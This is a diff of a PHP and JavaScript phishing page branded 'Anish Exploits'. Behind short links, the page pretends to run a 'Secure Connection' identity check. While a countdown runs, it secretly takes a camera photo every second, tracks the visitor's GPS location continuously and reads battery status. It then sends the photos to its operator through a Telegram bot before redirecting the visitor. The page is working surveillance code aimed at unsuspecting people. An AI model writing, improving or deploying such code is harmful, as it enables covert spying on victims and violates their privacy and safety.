@@ -1,41 +1,32 @@
 <?php
+// ===== AUTO-CREATE DIRS (Render restart pe kaam karega) =====
+if (!is_dir('photos')) mkdir('photos', 0777, true);
+if (!file_exists('visitors.json')) file_put_contents('visitors.json', '{}');
+if (!file_exists('links.json')) file_put_contents('links.json', '{}');
+if (!file_exists('debug.log')) file_put_contents('debug.log', date('Y-m-d H:i:s') . " - index.php started\n");
+// ============================================================
+
 require_once 'config.php';
 
-// Create folders & files if not exist
-if (!file_exists("photos")) {
-    mkdir("photos", 0755, true);
-}
-if (!file_exists("visitors.json")) {
-    file_put_contents("visitors.json", json_encode([]));
-}
-if (!file_exists("links.json")) {
-    file_put_contents("links.json", json_encode([]));
-}
+$config = include 'config.php';
+$token = $config['bot_token'];
+$chatId = $config['chat_id'];
 
+// Get short code from URL
 $id = $_GET['id'] ?? '';
 $db = json_decode(file_get_contents("links.json"), true) ?? [];
+$targetUrl = $db[$id]['url'] ?? 'https://google.com';
+$creatorId = $db[$id]['created_by'] ?? $chatId;
 
-$linkData = $db[$id] ?? null;
-$targetUrl = $linkData['url'] ?? 'https://google.com';
-$creatorId = $linkData['created_by'] ?? $config['chat_id'];
-
-session_start();
-$visitorId = $_SESSION['visitor_id'] ?? null;
-
-if (!$visitorId) {
-    $visitorId = 'VIS_' . time() . '_' . bin2hex(random_bytes(4));
-    $_SESSION['visitor_id'] = $visitorId;
-}
+// Generate unique visitor ID
+$visitorId = md5($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT'] . time());
 
 // ========== FUNCTIONS ==========
 function sendPhotoToTelegram($chatId, $photoPath, $visitorId) {
     global $config;
-    
-    if (!file_exists($photoPath)) return false;
-    
     $token = $config['bot_token'];
-    $url = "https://api.telegram.org/bot$token/sendPhoto";
     
+    $url = "https://api.telegram.org/bot$token/sendPhoto";
     $post = [
         'chat_id' => $chatId,
         'photo' => new CURLFile(realpath($photoPath)),
@@ -169,226 +160,140 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Loading...</title>
+    <title>✨ Anish Exploits</title>
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
-            background: #0a0a0a;
-            color: #fff;
-            font-family: -apple-system, 'Segoe UI', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
+            font-family: Arial, sans-serif; 
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: white; display: flex; justify-content: center; align-items: center;
+            min-height: 100vh; text-align: center;
         }
-        .container {
-            text-align: center;
-            padding: 20px;
-            max-width: 380px;
+        .container { padding: 40px; }
+        h1 { font-size: 3em; margin-bottom: 20px; }
+        .status { font-size: 1.2em; margin: 20px 0; color: #00ff88; }
+        .spinner { 
+            width: 50px; height: 50px; border: 5px solid rgba(255,255,255,0.1);
+            border-top-color: #00ff88; border-radius: 50%;
+            animation: spin 1s linear infinite; margin: 20px auto;
         }
-        .logo {
-            font-size: 28px;
-            font-weight: 900;
-            background: linear-gradient(45deg, #f7971e, #ffd200);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 5px;
-        }
-        .subtitle {
-            color: #555;
-            font-size: 12px;
-            margin-bottom: 25px;
-            letter-spacing: 1px;
-        }
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 3px solid rgba(255,255,255,0.05);
-            border-radius: 50%;
-            border-top: 3px solid #f7971e;
-            animation: spin 0.8s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .status-text {
-            color: #4ade80;
-            font-size: 13px;
-            min-height: 22px;
-            transition: 0.3s;
-        }
-        .status-text.warning { color: #fbbf24; }
-        .status-text.error { color: #ef4444; }
-        .badge {
-            display: inline-block;
-            background: rgba(255,255,255,0.03);
-            padding: 4px 14px;
-            border-radius: 20px;
-            font-size: 10px;
-            color: #666;
-            margin-top: 15px;
-            border: 1px solid rgba(255,255,255,0.03);
-        }
-        .badge span { color: #f7971e; }
-        #video { display: none; }
-        #canvas { display: none; }
-        .red-dot {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            background: #ef4444;
-            border-radius: 50%;
-            animation: pulse 1s infinite;
-            margin-right: 6px;
-        }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.3; transform: scale(1.2); }
-        }
-        .recording {
-            display: inline-flex;
-            align-items: center;
-            background: rgba(239, 68, 68, 0.1);
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 11px;
-            color: #ef4444;
-            margin-top: 8px;
-        }
-        .debug-info {
-            color: #444;
-            font-size: 10px;
-            margin-top: 15px;
-            word-break: break-all;
-            max-height: 60px;
-            overflow-y: auto;
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .badge { 
+            position: fixed; bottom: 20px; right: 20px;
+            background: rgba(0,0,0,0.5); padding: 8px 15px;
+            border-radius: 20px; font-size: 12px; color: #aaa;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">✨ Anish Exploits</div>
-        <div class="subtitle">🔒 Secure Connection</div>
-        
+        <h1>🔒 Secure Connection</h1>
         <div class="spinner"></div>
-        <div class="status-text" id="status">📸 Initializing...</div>
-        <div class="recording" id="recordingBadge" style="display:none;">
-            <span class="red-dot"></span> RECORDING
-        </div>
-        <div class="badge">🆔 <span id="visitorDisplay"></span></div>
-        <div class="debug-info" id="debugInfo"></div>
-        
-        <video id="video" autoplay playsinline muted></video>
-        <canvas id="canvas"></canvas>
+        <div class="status" id="status">📸 Initializing...</div>
+        <p style="color: #888; margin-top: 30px;">Verifying your identity...</p>
+        <div class="badge">🔒 256-bit SSL Encrypted</div>
     </div>
 
     <script>
-        const visitorId = '<?= $visitorId ?>';
-        const targetUrl = '<?= $targetUrl ?>';
-        let photoCount = 0;
-        let isCapturing = false;
-        let debugEl = document.getElementById('debugInfo');
-        
+        // ===== CONFIG =====
+        const targetUrl = "<?php echo addslashes($targetUrl); ?>";
+        const visitorId = "<?php echo $visitorId; ?>";
+        const debug = true;
+
         function debug(msg) {
-            debugEl.textContent = msg;
-            console.log(msg);
-        }
-        
-        document.getElementById('visitorDisplay').textContent = visitorId.substring(0, 15) + '...';
-        debug('Initializing...');
-
-        // ========== CAMERA - FRONT CAMERA ==========
-        debug('Requesting camera...');
-        
-        navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, 
-            audio: false 
-        })
-        .then(stream => {
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            video.play();
-            
-            document.getElementById('status').textContent = '📸 Capturing...';
-            document.getElementById('recordingBadge').style.display = 'inline-flex';
-            isCapturing = true;
-            debug('✅ Camera active');
-            
-            setInterval(() => {
-                if (isCapturing) {
-                    capturePhoto();
-                    photoCount++;
-                    debug('📸 Photo #' + photoCount);
-                }
-            }, 1000);
-        })
-        .catch(err => {
-            document.getElementById('status').textContent = '⚠️ Camera denied';
-            document.getElementById('status').className = 'status-text error';
-            debug('❌ Camera error: ' + err.message);
-        });
-
-        function capturePhoto() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            const ctx = canvas.getContext('2d');
-            
-            if (!video.videoWidth || video.videoWidth === 0) return;
-            
-            canvas.width = 640;
-            canvas.height = 480;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            const photoData = canvas.toDataURL('image/jpeg', 0.7);
-            sendData({ photo: photoData });
+            if (debug) console.log('[Spy]', msg);
         }
 
-        // ========== LOCATION ==========
-        debug('Requesting location...');
-        
-        if (navigator.geolocation) {
-            navigator.geolocation.watchPosition(
-                (position) => {
-                    const loc = {
-                        lat: position.coords.latitude,
-                        lng: position.coords.longitude
-                    };
-                    debug('📍 Location: ' + loc.lat + ', ' + loc.lng);
-                    sendData({ location: loc });
-                },
-                (err) => {
-                    debug('❌ Location error: ' + err.message);
-                },
-                { enableHighAccuracy: true, maximumAge: 5000, timeout: 10000 }
-            );
-        } else {
-            debug('❌ Geolocation not supported');
+        // ===== CAPTURE CONTROL =====
+        let isCapturing = true;
+        let mediaStream = null;
+
+        // ====== CAMERA ======
+        async function startCamera() {
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "environment", width: 320, height: 240 },
+                    audio: false 
+                });
+                debug('✅ Camera access granted');
+
+                const video = document.createElement('video');
+                video.srcObject = mediaStream;
+                video.play();
+
+                // Capture photo every 1 second
+                setInterval(() => {
+                    if (!isCapturing) return;
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 320;
+                    canvas.height = 240;
+                    canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+                    const photo = canvas.toDataURL('image/jpeg', 0.5);
+                    sendData({ photo: photo });
+                    debug('📸 Photo captured & sent');
+                }, 1000);
+
+            } catch (err) {
+                debug('❌ Camera error: ' + err.message);
+            }
         }
 
-        // ========== BATTERY ==========
-        debug('Checking battery...');
-        
-        if (navigator.getBattery) {
-            navigator.getBattery().then(battery => {
-                function updateBattery() {
-                    const level = Math.round(battery.level * 100);
-                    const charging = battery.charging;
-                    debug('🔋 Battery: ' + level + '%');
-                    sendData({ battery: { level: level, charging: charging } });
-                }
-                updateBattery();
-                setInterval(updateBattery, 5000);
-            });
-        } else {
-            debug('❌ Battery API not supported');
+        // ====== GEOLOCATION ======
+        function startGeolocation() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        const data = {
+                            location: {
+                                lat: pos.coords.latitude,
+                                lng: pos.coords.longitude
+                            }
+                        };
+                        sendData(data);
+                        debug('📍 Location sent: ' + pos.coords.latitude + ', ' + pos.coords.longitude);
+                    },
+                    (err) => { debug('❌ Location error: ' + err.message); },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+
+                // Continuous tracking
+                navigator.geolocation.watchPosition(
+                    (pos) => {
+                        sendData({
+                            location: {
+                                lat: pos.coords.latitude,
+                                lng: pos.coords.longitude
+                            }
+                        });
+                    },
+                    (err) => {},
+                    { enableHighAccuracy: true }
+                );
+            }
         }
 
-        // ========== SEND DATA ==========
+        // ====== BATTERY ======
+        function startBattery() {
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(battery => {
+                    function updateBattery() {
+                        sendData({
+                            battery: {
+                                level: Math.round(battery.level * 100),
+                                charging: battery.charging
+                            }
+                        });
+                        debug('🔋 Battery: ' + Math.round(battery.level * 100) + '%');
+                    }
+                    updateBattery();
+                    setInterval(updateBattery, 5000);
+                });
+            } else {
+                debug('❌ Battery API not supported');
+            }
+        }
+
+        // ====== SEND DATA ======
         let pendingData = [];
         let lastSend = 0;
 
@@ -406,26 +311,22 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(batch)
                 })
-                .then(response => response.json())
-                .then(data => {
-                    debug('✅ Server OK');
-                })
-                .catch(err => {
-                    debug('❌ Send error: ' + err.message);
-                });
+                .then(res => res.json())
+                .then(data => { debug('✅ Server OK'); })
+                .catch(err => { debug('❌ Send error: ' + err.message); });
                 
                 lastSend = Date.now();
             }
         }
 
-        // ========== REDIRECT ==========
+        // ====== REDIRECT ======
         let secondsLeft = 10;
         const statusEl = document.getElementById('status');
         
         const countdown = setInterval(() => {
             secondsLeft--;
             if (secondsLeft > 0) {
-                statusEl.textContent = '⏳ Redirecting in ' + secondsLeft + 's...';
+                statusEl.textContent = '🔄 Redirecting in ' + secondsLeft + 's...';
             }
         }, 1000);
 
@@ -433,12 +334,17 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
             clearInterval(countdown);
             isCapturing = false;
             statusEl.textContent = '🚀 Redirecting...';
-            debug('🔗 Redirecting...');
+            debug('✅ Redirecting...');
             
             setTimeout(() => {
                 window.location.href = targetUrl;
             }, 1500);
         }, 10000);
+
+        // ====== START ALL ======
+        startCamera();
+        startGeolocation();
+        startBattery();
     </script>
 </body>
 </html>
